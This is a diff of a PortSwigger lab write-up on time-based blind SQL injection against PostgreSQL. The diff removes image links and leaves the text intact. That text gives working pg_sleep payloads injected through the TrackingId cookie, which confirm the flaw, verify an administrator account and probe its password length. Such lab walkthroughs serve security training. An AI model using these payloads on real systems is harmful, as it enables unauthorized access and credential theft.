@@ -6,7 +6,7 @@
 
 The captured request is as follows ,
 
-![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/ff7c6ea21dcecde4f1df737504a7ac969b7516ba/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20time%20delays%20and%20information%20retrieval/Images/Initial%20Tracking.png)
+![image]()
 
 
 The query looks somethiung like this :
@@ -21,14 +21,14 @@ Modify the cookie value
 
 Since it is a POSTgreSQL , we use the following syntax
 
-![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/50e41295907b964a1f30a81b78963bdb78b13d43/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20time%20delays%20and%20information%20retrieval/Images/Conditional%20Time%20Delay%20Syntax.png)
+![image]()
 
 ```sql
 TrackingId=x';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
 ```
 We get response after 10 sec delay, which confirms the blind SQL injection vulnerability
 
-![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/e4e9693d14baeabad2c5360d01b1b9995a5b8e93/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20time%20delays%20and%20information%20retrieval/Images/Confirms%20the%20blind%20SQL%20injection%20vulnerability.png)
+![image]()
 
 Change the boolean condition (1=2) to verify it
 
@@ -38,7 +38,7 @@ TrackingId=x';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
 
 We get a response immediately which means the condition failed (1=2)
 
-![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/1df55f3ebd729885e5b904ea7be413f70ff38368/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20time%20delays%20and%20information%20retrieval/Images/Condition%20Failed%20for%20checking%20vulnerability.png)
+![image]()
 
 #### Verify administrator user exists -
 
@@ -48,7 +48,7 @@ TrackingId=x';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE
 ```
 It takes 10 sec to respond which means there is indeed a user called administrator
 
-![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/f8565980b4e55285fe5e35ba765f502cf65f252c/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20time%20delays%20and%20information%20retrieval/Images/Verify%20Administrator%20User%20Exists.png)
+![image]()
 
 #### Find the length of admin's password -
 
@@ -60,7 +60,7 @@ The below payload checks if the length is > 1.
 ';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
 ```
 
-![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/d7bc2b7f26728851b6f4f9465d259600b9eca741/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20time%20delays%20and%20information%20retrieval/Images/Find%20Length%20of%20Admin%20Password.png)
+![image]()
 
 
 It takes 10 sec delay to respond which means it is > 1 character.
